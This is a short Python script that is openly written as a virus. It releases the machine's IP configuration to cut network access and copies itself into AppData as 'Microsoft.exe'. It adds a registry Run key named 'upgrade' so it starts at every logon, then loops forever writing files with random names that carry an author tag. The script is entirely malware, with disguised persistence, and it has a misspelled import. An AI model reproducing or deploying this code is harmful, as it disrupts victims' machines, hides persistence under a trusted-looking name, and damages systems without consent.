import time
import random
import shutill
import sys
import os
import subprocess


i = 0

os.system("ipconfig/release")
new = os.environ["appdata"] + "\\Microsoft.exe"
if not os.path.exists(new):
	shutil.copyfile(sys.executable,new)
	regedit = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new
	subprocess.call(regedit, shell=True)


while i < 1:
	file_name = random.randint(1,750)
	virus = open(str(file_name)+".txt","w")
	virus.write("Made Me https://github.com/xrypt0")
	print("Made Me https://github.com/xrypt0")
	time.sleep(1)

	i = i - 1
